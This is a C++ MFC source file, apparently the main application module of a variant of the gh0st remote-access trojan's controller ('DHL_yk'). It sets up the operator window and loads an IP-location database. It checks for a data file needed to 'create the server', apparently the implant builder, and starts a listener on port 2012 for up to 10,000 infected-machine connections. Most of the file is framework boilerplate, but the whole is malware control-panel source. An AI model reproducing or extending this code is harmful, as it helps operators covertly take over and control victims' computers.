// gh0st.cpp : Defines the class behaviors for the application.
//
//#include <vld.h>  //调试用
#include "stdafx.h"
#include "DHL_yk.h"

#include "MainFrm.h"
#include "gh0stDoc.h"
#include "gh0stView.h"
#include "PcView.h"

#include <assert.h> 

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/*
void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	char buff[1024];
	memset(buff, 0, sizeof(buff));
	wsprintf
		(buff, 
		"CRASH CODE:0x%.8x ADDR=0x%.8x FLAGS=0x%.8x PARAMS=0x%.8x\n",
		"eax=%.8x ebx=%.8x ecx=%.8x\nedx=%.8x esi=%.8x edi=%.8x\neip=%.8x esp=%.8x ebp=%.8x\n",
		ExceptionInfo->ExceptionRecord->ExceptionCode,
		ExceptionInfo->ExceptionRecord->ExceptionAddress,
		ExceptionInfo->ExceptionRecord->ExceptionFlags,
		ExceptionInfo->ExceptionRecord->NumberParameters,
		ExceptionInfo->ContextRecord->Eax,
		ExceptionInfo->ContextRecord->Ebx,
		ExceptionInfo->ContextRecord->Ecx,
		ExceptionInfo->ContextRecord->Edx,
		ExceptionInfo->ContextRecord->Esi,
		ExceptionInfo->ContextRecord->Edi,
		ExceptionInfo->ContextRecord->Eip,
		ExceptionInfo->ContextRecord->Esp,
		ExceptionInfo->ContextRecord->Ebp
		);
	
	MessageBox(NULL, buff, "错误！！", MB_OK);
}
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	// 不退出
	return true;
}
*/
/////////////////////////////////////////////////////////////////////////////
// CGh0stApp

BEGIN_MESSAGE_MAP(CGh0stApp, CWinApp)
	//{{AFX_MSG_MAP(CGh0stApp)
	ON_COMMAND(IDM_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stApp construction
char CGh0stApp::szCurPath[]={NULL};

CGh0stApp::CGh0stApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
	//密码验证登录

	// 初始化本进程的图像列表, 为加载系统图标列表做准备
	typedef BOOL (WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit) GetProcAddress(LoadLibrary("shell32.dll"), (LPCSTR)660);
	FileIconInit(TRUE);

	CHAR ModuletemDis[MAX_PATH]={0};
	GetCurrentDirectory(MAX_PATH,(LPTSTR)(ModuletemDir));  //用于获取当前目录
	sprintf(ModuletemDis,"%s\\Control\\QQwry.dat",ModuletemDir);   //连接安装目录和程序名称

	HANDLE	hFile = CreateFile(ModuletemDis, 0, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = true;
	}
	else
	{
		m_bIsQQwryExist = false;
	}
	CloseHandle(hFile);

	m_bIsDisablePopTips = m_IniFile.GetInt("设置", "PopTips", false);
	m_pConnectView = NULL;

//	m_Hmodule = LoadLibrary(szDllPath);

	GetCurrentDirectory(MAX_PATH,szCurPath);
	strcat(szCurPath,"\\Update\\DHL2012.dat");
	if( INVALID_FILE_ATTRIBUTES==GetFileAttributes(szCurPath))
	{
		MessageBox(NULL,"Dat 文件无法找到!无法创建服务端!","警告",MB_OK);
	}
}


/////////////////////////////////////////////////////////////////////////////
// The one and only CGh0stApp object

CGh0stApp theApp;
/////////////////////////////////////////////////////////////////////////////
// CGh0stApp initialization

BOOL CGh0stApp::InitInstance()
{

	AfxEnableControlContainer();

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

/*
	//密码验证登录
	Login Loging;
 	int nResponse = Loging.DoModal();
	if (nResponse != IDOK)
	{
		return FALSE;
	}
*/
    SetRegistryKey(_T("Local AppWizard-Generated Applications"));
    LoadStdProfileSettings();  // Load standard INI file options (including MRU)


	CSingleDocTemplate* pDocTemplate;
	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(CGh0stDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(CGh0stView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
//	cmdInfo.m_nShellCommand = CCommandLineInfo::FileNothing;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;
	
	// 去掉菜单栏
//	m_pMainWnd->SetMenu(NULL);
	// The one and only window has been initialized, so show and update it.
	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();
	// 启动IOCP服务器

	int	nPort = m_IniFile.GetInt("设置", "ListenPort");
	int	nMaxConnection = m_IniFile.GetInt("设置", "MaxConnection");
	if (nPort == 0)
		nPort = 2012;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	
	if (m_IniFile.GetInt("设置", "MaxConnectionAuto"))
		nMaxConnection = 8000;

	((CMainFrame*) m_pMainWnd)->Activate(nPort, nMaxConnection);

	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
//	afx_msg void OnAqglRz();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
//	ON_COMMAND(IDC_AQGL_RZ, OnAqglRz)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CGh0stApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

DWORD CGh0stApp::GetRand()
{
	typedef DWORD (WINAPI *tGetRandNum)();
	tGetRandNum pGetRandNum = (tGetRandNum)GetProcAddress(m_Hmodule,"GetRandNum");

	if(pGetRandNum)
		return pGetRandNum();
	return TRUE;
}

//随机字符串产生函数，支持链式结构    
void CGh0stApp::GetRandString(LPSTR szStr,DWORD len)  
{  
    assert(szStr != NULL);  
    char* pvCode = szStr;  
    char  singleCode[2];  
    char  verificationValue[64] = "00123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";  
    memset(szStr,0 ,len);  
    memset(singleCode,0,2);   
    srand((unsigned int)time((time_t *)NULL));  
    for(int i=1; i <= len; ++i)  
    {  
        sprintf(singleCode,"%c",verificationValue[(rand()%62)+1]);  
        strcat(szStr,singleCode);     
    }  
}  
